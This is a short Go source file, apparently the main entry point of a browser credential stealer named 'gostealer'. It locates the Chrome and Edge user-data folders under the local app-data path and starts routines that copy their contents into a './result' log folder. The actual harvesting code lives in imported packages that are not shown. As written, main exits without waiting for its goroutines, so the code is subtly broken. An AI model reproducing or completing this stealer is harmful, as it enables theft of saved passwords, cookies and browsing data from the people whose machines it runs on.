package main

import (
	"os"
	"path"

	"github.com/4kord/gostealer/browsers"
	"github.com/4kord/gostealer/utils"
)

var (
	logFolderPath string
)

func main() {
	logFolderPath = "./result"

	utils.CreateStructure(logFolderPath)

	edgePath := path.Join(os.Getenv("localappdata"), `Microsoft\Edge\User Data`)
	chromePath := path.Join(os.Getenv("localappdata"), `Google\Chrome\User Data`)

	go browsers.Chrome(chromePath, logFolderPath)
	go browsers.Edge(edgePath, logFolderPath)

}
